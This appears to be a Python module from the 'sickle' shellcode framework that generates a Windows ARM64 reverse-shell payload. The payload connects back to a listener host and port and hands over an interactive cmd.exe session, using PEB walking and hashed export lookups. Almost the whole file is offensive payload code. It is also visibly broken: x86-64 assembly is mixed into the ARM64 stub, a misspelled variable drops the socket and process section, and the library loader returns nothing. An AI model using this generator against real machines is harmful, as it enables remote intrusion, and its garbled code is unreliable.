from sys import argv
from struct import pack
from ctypes import sizeof
from ctypes import c_uint64 

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.lib.programmer.instantiator import gen_offsets
from sickle.common.lib.programmer.instantiator import init_sc_args
from sickle.common.lib.programmer.instantiator import calc_stack_space

from sickle.common.lib.generic.mparser import argument_check
from sickle.common.lib.generic.convert import port_str_to_htons
from sickle.common.lib.generic.convert import from_str_to_xwords
from sickle.common.lib.generic.convert import ip_str_to_inet_addr
from sickle.common.lib.generic.convert import from_str_to_win_hash

from sickle.common.headers.windows.ntdef import _LIST_ENTRY
from sickle.common.headers.windows.ntdef import _UNICODE_STRING
from sickle.common.headers.windows.winnt import _IMAGE_DOS_HEADER
from sickle.common.headers.windows.winnt import _IMAGE_NT_HEADERS64
from sickle.common.headers.windows.winnt import _IMAGE_EXPORT_DIRECTORY
from sickle.common.headers.windows.winnt import _IMAGE_OPTIONAL_HEADER64
from sickle.common.headers.windows.winternl import _PEB
from sickle.common.headers.windows.winternl import _PEB_LDR_DATA
from sickle.common.headers.windows.winternl import _LDR_DATA_TABLE_ENTRY
from sickle.common.headers.windows.winsock2 import AF_INET
from sickle.common.headers.windows.winsock2 import sockaddr
from sickle.common.headers.windows.winsock2 import SOCK_STREAM
from sickle.common.headers.windows.winsock2 import IPPROTO_TCP
from sickle.common.headers.windows.processthreadsapi import _STARTUPINFOA
from sickle.common.headers.windows.processthreadsapi import STARTF_USESTDHANDLES

class Shellcode():

    arch = "aarch64"

    platform = "windows"

    name = f"Windows ({arch}) CMD Reverse Shell"

    module = f"{platform}/{arch}/shell_reverse_tcp"

    example_run = f"{argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = []

    summary = ("TCP-based reverse shell over IPv4 that provides an interactive cmd.exe "
               "session")

    description = """
    A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe
    session. Since this payload is not staged, there is no need for anything
    more than a Netcat listener.
    """

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        arg_object["architecture"] = Shellcode.arch
        self.builder = Assembler(Shellcode.arch)

        self.dependencies = {
            "Kernel32.dll": [
                "LoadLibraryA",
                "CreateProcessA",
                "TerminateProcess",
            ],
            "Ws2_32.dll": [
                "WSAStartup",
                "WSASocketA",
                "connect",
            ],
        }

        sc_args = init_sc_args(self.dependencies)
        sc_args.update({
            "wsaData"                       : 0x00, 
            "name"                          : 0x00,
            "lpStartInfo"                   : 0x00,
        })

        self.stack_space = calc_stack_space(sc_args,
                                            sizeof(c_uint64))

        self.storage_offsets = gen_offsets(sc_args,
                                           Shellcode.arch)

        return

    def get_kernel32(self):
        """Generates stub for obtaining the base address of Kernel32.dll
        """


#rax -> x0
#rbx -> x1
#rcx -> x3
#rdx -> x4
#rsi -> x5
#rdi -> x6
#rbp -> x29
#rsp -> sp
#r8  -> x7
#r9  -> x8
#r10 -> x9
#r11 -> x10
#r12 -> x11
#r13 -> x12
#r14 -> x13
#r15 -> x14

        stub = f"""
getKernel32:
    mov w4, 0x4b
getPEB:
    ldr x7, [x18, #0x60]
getHeadEntry:
    ldr x6, [x7, #{_PEB.Ldr.offset}]
    ldr x6, [x6, #{_PEB_LDR_DATA.InLoadOrderModuleList.offset}]
search:
    eor x3, x3, x3
    ldr x0, [x6, #{_LDR_DATA_TABLE_ENTRY.DllBase.offset}]
    ldr x5, [x6, #{_LDR_DATA_TABLE_ENTRY.BaseDllName.offset + _UNICODE_STRING.Buffer.offset}]
    ldr x6, [x6]
    ldrh w13, [x5, #0x18]
    cmp w13, w3
    b.ne search
    ldrb w13, [x5]
    cmp w13, w4
    b.ne search
found:
    ret
        """

        return stub

    def lookup_function(self):
        """Generates the stub responsible for obtaining the base address of a function
        """

        stub = f"""
lookupFunction:
    ldr w1, [x6, #{_IMAGE_DOS_HEADER.e_lfanew.offset}]
    add x1, x1, #{_IMAGE_NT_HEADERS64.OptionalHeader.offset + _IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
    add x1, x1, x6
    ldr w0, [x1]
    mov x1, x6
    add x1, x1, x0
    ldr w0, [x1, #{_IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
    mov x7, x6
    add x7, x7, x0
    ldr w3, [x1, #{_IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
parseNames:
    cmp x3, #0
    b.eq error
    sub x3, x3, #1
    ldr w0, [x7, x3, lsl #2]
    mov x5, x6
    add x5, x5, x0 ; x5 points to function string
    eor x8, x8, x8
    eor x0, x0, x0
calcHash:
    ldrb w0, [x5]
    add x5, x5, #0x01
    ands wzr, w0, w0
    b.eq calcDone
    ror w8, w8, #0xD
    add x8, x8, x0
    b calcHash
calcDone:
    cmp w8, w4
    b.ne parseNames
findAddress:
    ldr w7, [x1, #{_IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
    add x7, x7, x6
    eor x0, x0, x0
    ldrh w0, [x7, x3, lsl #1]
    ldr w7, [x1, #{_IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
    add x7, x7, x6
    ldr w0, [x7, x0, lsl #2]
    add x0, x0, x6
error:
    ret
        """

        return stub

    def load_library(self, lib):
        """Generates the stub to load a library not currently loaded into a process
        """

        lists = from_str_to_xwords(lib)
        write_index = self.storage_offsets['functionName']

        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))

        for i in range(len(lists["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( pack('<Q', lists["QWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(lists["DWORD_LIST"])):
            src += "    mov ecx, dword 0x{}\n".format( pack('<L', lists["DWORD_LIST"][i]).hex() ) 
            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(lists["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( pack('<H', lists["WORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(lists["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        src += f"""
    xor rcx, rcx
    mov [rbp-{write_index}], cl
    lea rcx, [rbp - {self.storage_offsets['functionName']}]
    mov rax, [rbp - {self.storage_offsets['LoadLibraryA']}]
    call rax
        """
        
        src = ""

        return src

    def resolve_functions(self):
        """This function is responsible for loading all libraries and resolving respective functions
        """

        stub = ""
        for lib, imports in self.dependencies.items():
#            if (lib != "Kernel32.dll"):
#                stub += self.load_library(lib)
#                stub += """
#    mov x6, x0
#                """

            for func in range(len(imports)):
                stub += f"""
get_{imports[func]}:
    ldr w4, ={from_str_to_win_hash(imports[func])}
    bl lookupFunction
    str x0, [x29, #-{self.storage_offsets[imports[func]]}]
                """

        return stub

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])


        shellcode = f"""
_start:
    brk #0
    stp x29, x30, [sp, #-{self.stack_space}]!
    mov x29, sp

    bl getKernel32
    mov x6, x0
"""

        shellcode += self.resolve_functions()
        
        shellcod = f"""
; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX => MAKEWORD(2, 2) 
;                   [out] LPWSADATA lpWSAData);       // RDX => &wsaData
call_WSAStartup:
    mov rcx, 0x202
    lea rdx, [rbp - {self.storage_offsets['wsaData']}]
    mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
    call rax

; RAX => WSASocketA([in] int                 af,              // RCX      => AF_INET
;                   [in] int                 type,            // RDX      => SOCK_STREAM
;                   [in] int                 protocol,        // R8       => IPPROTO_TCP
;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // R9       => NULL
;                   [in] GROUP               g,               // RSP+0x20 => NULL
;                   [in] DWORD               dwFlags);        // RSP+0x28 => NULL
call_WSASocketA:
    mov ecx, {AF_INET}
    mov edx, {SOCK_STREAM}
    mov r8, {IPPROTO_TCP}
    xor r9, r9
    mov [rsp+0x20], r9
    mov [rsp+0x28], r9
    mov rax, [rbp - {self.storage_offsets['WSASocketA']}]
    call rax
    mov rsi, rax ; save the socket file descriptor (sockfd)

; RAX => connect([in] SOCKET s,             // RCX => sockfd (Obtained from WSASocketA)
;                [in] const sockaddr *name, // RDX => {{ IP | PORT | SIN_FAMILY }}
;                [in] int namelen);         // R8  => sizeof(sockaddr)
call_connect:
    mov rcx, rax
    mov r8, {sizeof(sockaddr)}
    lea rdx, [rbp - {self.storage_offsets['name']}]
    mov r9, {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}{pack('<H', lport).hex()}0002
    mov [rdx], r9
    xor r9, r9
    mov [rdx + 0x8], r9
    mov rax, [rbp - {self.storage_offsets['connect']}]
    call rax

; [RBX] => typedef struct _STARTUPINFOA {{ }}
setup_STARTUPINFOA:
    mov rdi, rbp
    add rdi, {self.storage_offsets['lpStartInfo']}

    mov rbx, rdi  ; RDI = Destination ( memset(rdi, value, x) )
    xor eax, eax  ; EAX = 0x00 (value)
    mov ecx, 0x20 ; 0x20 * sizeof(DWORD) = (x -> 0x80)
    rep stosd     ; Zero out x bytes

    mov eax, {sizeof(_STARTUPINFOA)} ; lpStartInfo.cb = sizeof(_STARTUPINFO)
    mov [rbx], eax

    mov eax, {STARTF_USESTDHANDLES}
    mov [rbx + {_STARTUPINFOA.dwFlags.offset}], eax
    mov [rbx + {_STARTUPINFOA.hStdInput.offset}], rsi
    mov [rbx + {_STARTUPINFOA.hStdOutput.offset}], rsi
    mov [rbx + {_STARTUPINFOA.hStdError.offset}], rsi

; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX      => NULL
;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX      => "cmd"
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // R8       => NULL
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // R9       => NULL
;                       [in]                BOOL                  bInheritHandles,       // RSP+0x20 => NULL
;                       [in]                DWORD                 dwCreationFlags,       // RSP+0x28 => 0x01 (DEBUG_PROCESS)
;                       [in, optional]      LPVOID                lpEnvironment,         // RSP+0x30 => NULL
;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38 => NULL
;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40 => &lpStartupInfo
;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48 => &lpStartupInfo ()
call_CreateProccessA:
    xor ecx, ecx                 ; lpApplicationName
    mov rdx, rbp                 ; lpCommandLine
    add rdx, 0x180               ;
    mov eax, 0x646d63            ; "cmd"
    mov [rdx], rax
    xor r8, r8                   ; lpProcessAttributes
    xor r9, r9                   ; lpThreadAttributes
    xor eax, eax                 ;
    inc eax
    mov [rsp + 0x20], rax        ; bInheritHandles
    dec eax
    mov [rsp + 0x28], rax        ; dwCreationFlags
    mov [rsp + 0x30], rax        ; lpEnvironment
    mov [rsp + 0x38], rax        ; lpCurrentDirectory
    mov [rsp + 0x40], rbx        ; lpStartupInfo
    add rbx, 0x68
    mov [rsp + 0x48], rbx        ; lpProcessInformation
    mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
    call rax

; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
;                         [in] UINT   uExitCode); // RDX => 0x00 (Clean Exit)
call_TerminateProcess:
	xor rcx, rcx
	dec rcx
	xor rdx, rdx
	mov rax, [r15 + {self.storage_offsets['TerminateProcess']}]
	call rax

fin:
    ldp x29, x30, [sp], #16
    ret
"""

        shellcode += self.get_kernel32()
        shellcode += self.lookup_function()

        print(shellcode)

        return shellcode

    def get_shellcode(self):
        """Generates Windows (x64) generic reverse shell
        """

        return self.builder.get_bytes_from_asm(self.generate_source())
